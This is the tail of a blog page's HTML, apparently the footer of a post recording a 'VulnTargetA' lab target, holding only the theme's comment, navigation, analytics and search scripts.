class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/11/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%94)%E4%B9%8BVulnTargetA/'
+    this.page.identifier = '/2024/11/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%94)%E4%B9%8BVulnTargetA/'
+    this.page.title = '打靶记录(一六五)之VulnTargetA'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
